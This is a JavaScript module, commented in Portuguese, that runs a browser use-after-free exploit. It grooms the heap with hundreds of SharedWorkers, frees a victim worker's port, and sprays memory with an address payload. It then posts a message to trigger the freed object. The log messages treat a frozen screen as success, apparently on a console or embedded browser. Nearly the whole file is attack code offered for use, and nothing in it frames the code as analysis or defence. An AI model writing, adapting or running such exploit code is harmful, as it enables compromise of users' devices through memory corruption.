import { CONFIG } from './config.mjs';
import { log } from './utils.mjs';
import { prepare_heap } from './heap.mjs';
import { build_rainbow_payload } from './payloads.mjs';

var workers_stash = [];
var is_running = false;

export function init() {
    document.getElementById("btn_run").addEventListener("click", start_exploit);
    log("Módulos carregados. Pronto.");
}

async function start_exploit() {
    if (is_running) return;
    if (!window.SharedWorker) return log("Erro: Navegador incompatível.", "fail");
    
    is_running = true;
    log(">>> INICIANDO RAINBOW SPRAY <<<", "warn");

    // 1. Payload
    const payload = build_rainbow_payload();
    
    // 2. Heap
    prepare_heap();

    // 3. Base Grooming (0-380)
    log("Grooming (380)...");
    workers_stash = [];
    for(let i=0; i<380; i++) {
        try { workers_stash.push(new SharedWorker("data:text/javascript,1", "g"+i)); } catch(e){}
    }

    // 4. Trigger Loop
    let p_count = 0;
    const limit = CONFIG.WORKER_LIMIT - 380;
    
    const interval = setInterval(() => {
        if (p_count >= limit) {
            clearInterval(interval);
            trigger_uaf(payload);
            return;
        }

        try {
            let w = new SharedWorker("data:text/javascript,1", "v_"+p_count);
            w.port.start();
            workers_stash.push(w);
        } catch(e){}
        
        p_count++;
    }, 100);
}

function trigger_uaf(payload) {
    log("!!! DISPARANDO (403) !!!", "fail");
    
    // 1. Vítima
    const victim = workers_stash.pop();
    const port = victim.port;

    // 2. FREE
    victim.port.close();
    
    // 3. RAINBOW SPRAY
    // Inundamos a memória com o payload que contém MÚLTIPLOS endereços
    const spray = [];
    for(let k=0; k<CONFIG.SPRAY_QUANTITY; k++) {
        spray.push(new Uint32Array(payload));
    }

    // 4. FORCE EXECUTION
    try {
        port.postMessage("PIVOT");
    } catch(e) {}

    log("Aguardando...");
    log("SE CONGELAR (Imagem parada, Luz Branca): SUCESSO.");
    log("SE DESLIGAR: Tente novamente (ASLR azarado).");
}
